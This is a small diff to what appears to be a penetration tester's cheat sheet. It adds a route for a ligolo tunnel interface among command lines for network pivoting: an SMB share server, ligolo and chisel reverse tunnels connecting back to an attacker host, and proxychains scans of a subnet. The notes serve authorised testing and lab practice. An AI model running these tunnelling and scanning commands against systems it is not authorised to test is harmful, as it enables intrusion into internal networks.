@@ -116,6 +116,7 @@ impacket-smbserver -smb2support share .
 sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up
 ./ligolo-proxy -selfcert
 ./agent -connect $LHOST:11601 -ignore-cert
+sudo ip route add 172.16.0.0/24 dev ligolo
 chisel server -p 8000 --reverse
 ./chisel client $LHOST:8000 R:socks
 proxychains4 -q nxc smb $SUBNET
